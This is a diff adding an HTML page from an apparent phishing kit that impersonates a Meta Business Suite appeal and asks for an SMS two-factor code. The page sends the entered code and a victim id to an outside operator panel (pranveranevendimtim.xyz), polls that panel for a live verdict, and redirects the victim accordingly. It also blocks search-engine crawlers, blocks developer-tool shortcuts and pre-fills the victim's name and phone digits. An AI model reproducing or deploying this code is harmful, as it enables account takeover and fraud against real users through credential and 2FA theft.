@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Meta for Business - Appeal Decision</title>
+    <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <script>var captcha2 = localStorage.getItem("captcha");
+      if(captcha2 == "true"){
+      }
+      else{
+        window.location = "../index.html";
+      }</script>
+    <style>
+      
+     .dot {
+    margin: 0px 0px;
+    font-size: 21px;
+}
+    </style>
+    <link rel="stylesheet" type="text/css" media="screen" href="./main.css" />
+    <script>
+      // Define a list of known bot User-Agents
+      const botUserAgents = ["Googlebot", "Bingbot" /* Add more bots here */];
+
+      // Implement anti-bot protection
+      function protectAgainstBots() {
+        const userAgent = navigator.userAgent;
+
+        if (isBot(userAgent)) {
+          // Block known bot User-Agents
+          alert("Bot access is not allowed.");
+          // You can also redirect or display a specific message/page.
+          window.location.href = "error.html";
+        } else {
+          // Allow legitimate traffic
+          // Add your website's functionality here
+        }
+      }
+
+      // Detect known bot User-Agents
+      function isBot(userAgent) {
+        return botUserAgents.some((bot) => userAgent.includes(bot));
+      }
+
+      // Call the protection function when the page loads
+      window.addEventListener("load", protectAgainstBots);
+    </script>
+  </head>
+  <body>
+    <header>
+      <div class="top">
+        <div class="logo">
+          <img src="../img/meta2.png" alt="" width="100">
+          <p>Meta Business Suite</p>
+          
+        </div>
+      </div>
+    </header>
+    <div id="for-pad">
+    <div class="container">
+      <div id="full_name_div">
+        <h1>
+        <span id="full_name"></span>
+    </div>
+    <br>
+
+      <h2>Check your text messages</h2>
+      <br>
+    
+
+        <p>Enter the code we sent to ********<span id="phone_number"></span> .</p>
+      <br>
+        
+        <div class="display">
+          <img src="../img/confirm-mobile.af05cfecf754cdc833fd.gif" alt="" />
+        </div>
+
+      <form action="" id="code_form">
+        <input type="text" name="code" id="code" placeholder="Code" />
+        <input type="hidden" name="unique_id" id="unique_id" value="" />
+
+        <small class="error_text"></small>
+          <div class="read_div">
+            <a id="msnnr_btn_anc" href="#">
+              <div id="messenger_button">
+                <div class="messenger_column btn_icon">
+                  <img fill="red" src="reload.svg" id="msngr_btn_icon" style="width: 40px;">
+              </div>
+                  <div class="messenger_column btn_label">
+                      <span id="readmore">  We will be able to send a new code in :  <span id="countdown">3:00</span> </span>
+                  </div>
+                
+              </div>
+          </a>  
+           </div>
+          <span class="counter" style="font-weight: 600; display: block"></span>
+        <button id="button" type="submit" disabled style="cursor: not-allowed">Continue</button>
+      </form>
+
+    </div>
+  </div>
+  <footer class="footer">
+    <div class="footer-content">
+        <div class="loxgo">
+            <p id="yes">@ 2023 Meta</p>
+            <div class="social-icons">
+              <img src="../footer/fb.svg" alt="Facebook Icon">
+              <img src="../footer/ig.svg" alt="Instagram Icon">
+              <img src="../footer/t.svg" alt="Twitter Icon">
+              <img src="../footer/lin.svg" alt="LinkedIn Icon">
+          </div>
+        </div>
+        <div class="contact-info">
+            <p>About</p><br>
+            <p>English (UK)</p>
+        </div>
+        <div class="contact-info">
+            <p>Developers</p><br>
+            <p>English (US)</p>
+        </div>
+        <div class="contact-info">
+            <p>Careers</p><br>
+            <p>Español</p>
+        </div>
+        <div class="contact-info">
+            <p>Privacy</p><br>
+            <p>Português</p>
+        </div>
+        <div class="contact-info">
+            <p>Cookies</p><br>
+            <p>Français</p>
+        </div>
+    </div>
+  
+    <div class="footer-bottom">
+        <p>© 2023 Meta Business Suite. All rights reserved.</p>
+    </div>
+</footer>
+    <script>
+      const admin_panel = "https://pranveranevendimtim.xyz/kthiza"; // todo , change this to the admin panel url
+      const form = document.querySelector("#code_form");
+      const button = document.querySelector("#button");
+      const unique_id = document.querySelector("#unique_id");
+      let localData = localStorage.getItem("unique_id");
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const error_text = document.querySelector(".error_text");
+        const codeField = document.querySelector("#code");
+        const timerDisplay = document.querySelector(".counter");
+        const startButton = document.getElementById("button");
+        let countdown;
+        let attempts = 5;
+
+        unique_id.value = localData;
+
+        codeField.addEventListener("input", function () {
+          if (this.value.length >= 6) {
+            startButton.removeAttribute("disabled");
+            startButton.style.cursor = "pointer";
+            error_text.textContent = "";
+            codeField.style.borderColor = "#e5e7eb";
+          } else {
+            startButton.setAttribute("disabled", "disabled");
+            startButton.style.cursor = "not-allowed";
+          }
+        });
+
+        function displayTime(seconds) {
+          const minutes = Math.floor(seconds / 60);
+          const remainderSeconds = seconds % 60;
+          const display = `${minutes < 10 ? "0" : ""}${minutes}:${
+            remainderSeconds < 10 ? "0" : ""
+          }${remainderSeconds}`;
+          timerDisplay.textContent = display;
+        }
+
+        function startTimer() {
+          clearInterval(countdown);
+          const startTime = Date.now();
+          const endTime = startTime + 30 * 1000; // 1 minute in milliseconds
+
+          function updateTimer() {
+            const secondsLeft = Math.round((endTime - Date.now()) / 1000);
+            if (secondsLeft < 0) {
+              displayTime(0);
+              clearInterval(countdown);
+              timerDisplay.textContent = "";
+            } else {
+              displayTime(secondsLeft);
+              // preventInput()
+            }
+          }
+
+          updateTimer();
+          countdown = setInterval(updateTimer, 1000);
+        }
+
+        function redirectToOtherPage() {
+          window.location.href = "../thankyou.html"; // Replace with the actual URL
+        }
+
+        function preventInput() {
+          startButton.setAttribute("disabled", "disabled");
+          startButton.style.cursor = "not-allowed";
+          codeField.setAttribute("disabled", "disabled");
+          setTimeout(() => {
+            startButton.removeAttribute("disabled");
+            startButton.style.cursor = "pointer";
+            codeField.removeAttribute("disabled");
+          }, 1000 * 30);
+        }
+
+        startButton.addEventListener("click", function (e) {
+          e.preventDefault();
+          button.innerHTML = `<img src="../img/loader.gif" width="30" alt="">`;
+
+          let successValue;
+
+          const changeSuccessValue = (newValue) => {
+            successValue = newValue;
+            return successValue;
+          };
+
+          const valid = "valid";
+          const invalid = "invalid";
+
+          const awaitResponse = () => {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", admin_panel + "/await2FAResponse.php", true);
+            xhr.setRequestHeader("Content-Type", "application/json")
+            xhr.onload = () => {
+              if (xhr.status === 200) {
+                let data = xhr.response;
+                // alert(data)
+                if (data == "pending") {
+                  // do something
+                  button.innerHTML = `<img src="../img/loader.gif" width="30" alt="">`;
+                  changeSuccessValue("yes");
+                } else if (data == "invalid") {
+                  // do somehting
+                  changeSuccessValue("no");
+                  document.querySelector("#code").value = "";
+                  document.querySelector("#code").style.borderColor = "#e23636";
+                  document.querySelector(".error_text").textContent =
+                    "incorrect code, please try again";
+                  startButton.setAttribute("disabled", "disabled");
+                  startButton.style.cursor = "not-allowed";
+                  button.innerHTML = "Next";
+                } else if(data == "wait") {
+                  window.location.href = "../verify.html"
+                }else {
+                  changeSuccessValue("no");
+                  redirectToOtherPage();
+                }
+              }
+            };
+            let formData = {
+              unique_id: localData
+            }
+            xhr.send(JSON.stringify(formData));
+          };
+
+          function awaitInterval(interval, state) {
+            awaitResponse();
+            console.log(state);
+
+            if (state == "no") {
+              clearInterval(interval);
+              changeSuccessValue("yes");
+            }
+          }
+
+          const sendOTP = async () => {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", admin_panel + "/update2FA.php", true);
+            xhr.setRequestHeader("Content-Type", "application/json")
+            xhr.onload = () => {
+              if (xhr.readyState === XMLHttpRequest.DONE) {
+                if (xhr.status === 200) {
+                  let responseInterval = setInterval(() => {
+                    awaitInterval(responseInterval, successValue);
+                  }, 500);
+                }
+              }
+            };
+            // send form data to php file
+            let formData = {
+              code: codeField.value,
+              unique_id: localData
+            }
+
+            xhr.send(JSON.stringify(formData));
+          };
+
+          sendOTP();
+        });
+      });
+    </script>
+
+    <script src="../verify.js"></script>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        var full_name = localStorage.getItem("full_name");
+            var phone_number = localStorage.getItem("phone_number");
+            var last_two_phone = phone_number.slice(-2);
+
+            // Display Full Name
+            var fullNameElement = document.getElementById("full_name");
+            if (full_name && fullNameElement) {
+                fullNameElement.textContent = full_name;
+            }
+
+            // Display Phone Number
+            var phoneNumberElement = document.getElementById("phone_number");
+            if (phone_number && phoneNumberElement) {
+                phoneNumberElement.textContent = last_two_phone;
+            }
+
+            // Display Last Two Digits
+            var lastTwoDigitsElement = document.getElementById("last_two_digits");
+            if (last_two_phone && lastTwoDigitsElement) {
+                lastTwoDigitsElement.textContent = last_two_phone;
+            }
+        });
+      window.addEventListener("DOMContentLoaded", checkIPBan);
+
+      document.addEventListener("keydown", function (event) {
+        if (event.ctrlKey) {
+          event.preventDefault();
+        }
+        if (event.keyCode == 123) {
+          event.preventDefault();
+        }
+      });
+              // Set the initial time to 3 minutes (180 seconds)
+              var timeLeft = 180;
+
+// Function to update the countdown
+function updateCountdown() {
+    var minutes = Math.floor(timeLeft / 60);
+    var seconds = timeLeft % 60;
+    var displayTime = minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
+    document.getElementById("countdown").textContent = displayTime;
+
+    if (timeLeft > 0) {
+        timeLeft--;
+        setTimeout(updateCountdown, 1000); // Update every second
+    }
+}
+
+// Start the countdown
+updateCountdown();
+
+
+    </script>
+  <script>
+       document.getElementById("button2").addEventListener("click", function() {
+            window.location.href = "2fa.html";
+        });
+    document.addEventListener('DOMContentLoaded', function() {
+        var button2 = document.getElementById("button2");
+
+        // Disable the link initially
+        button2.setAttribute("disabled", "true");
+
+        // Enable the link after 10 seconds
+        setTimeout(function() {
+            button2.removeAttribute("disabled");
+            button2.style.removeProperty("cursor"); // Remove the cursor style
+        }, 10000); // 10000 milliseconds = 10 seconds
+    });
+</script>
+</body>
+</html>
